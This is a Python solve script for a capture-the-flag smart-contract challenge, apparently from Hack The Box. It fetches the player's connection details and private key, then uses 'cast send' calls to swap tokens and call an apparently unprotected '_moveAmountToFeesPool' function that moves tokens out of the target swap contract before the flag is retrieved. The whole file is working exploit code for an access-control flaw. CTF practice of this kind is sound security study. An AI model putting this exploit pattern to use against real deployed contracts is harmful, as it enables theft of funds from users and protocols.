#!/usr/bin/env python3
from os import system
from pwn import remote, context, args

context.log_level = "error"

if args.REMOTE:
    ip = args.HOST
    rpc_port = args.RPC_PORT
    tcp_port = args.TCP_PORT
    RPC_URL = f"http://{ip}:{int(rpc_port)}/"
    TCP_URL = f"{ip}:{int(tcp_port)}"
else:
    RPC_URL = f"http://localhost:8000/"
    TCP_URL = "localhost:8001"


def csend(contract: str, fn: str, *args):
    global rpc_url
    global pvk
    print(
        f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pvk}"
    )
    system(
        f"cast send {contract} '{fn}' {' '.join(args)} --rpc-url {rpc_url} --private-key {pvk}"
    )


if __name__ == "__main__":
    connection_info = {}

    # connect to challenge handler and get connection info
    with remote(TCP_URL.split(":")[0], int(TCP_URL.split(":")[1])) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"1")
        p.recvuntil(b"Here's your connection info:\n\n")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line:
            print(line)
            key, value = line.strip().split(': ')
            connection_info[key] = value

    secret = connection_info['RPC URL'].split("/")[-1]
    rpc_url = f"{RPC_URL}/rpc/{secret}"
    pvk = connection_info['Player Private Key']
    target = connection_info['Target Contract']
    weth_addr = connection_info['WETH Token Contract']
    htb_addr = connection_info['HTB Token Contract']

    csend(weth_addr, "approve(address,uint256)", target, str(1 * 10**18))
    csend(target, "swap(address,address,uint256)", weth_addr, htb_addr,
          str(1 * 10**18))
    csend(target, "_moveAmountToFeesPool(address,uint256)", htb_addr,
          str(499 *
              10**18))  # any amount is ok to solve but we want to be rich
    csend(htb_addr, "approve(address,uint256)", target, str(1 * 10**18))
    csend(target, "swap(address,address,uint256)", htb_addr, weth_addr,
          str(5 * 10**17))  # 0.5 HTB

    with remote(TCP_URL.split(":")[0], int(TCP_URL.split(":")[1])) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"3")
        flag = p.recvall().decode()

    print(f"\n\n[*] {flag}")
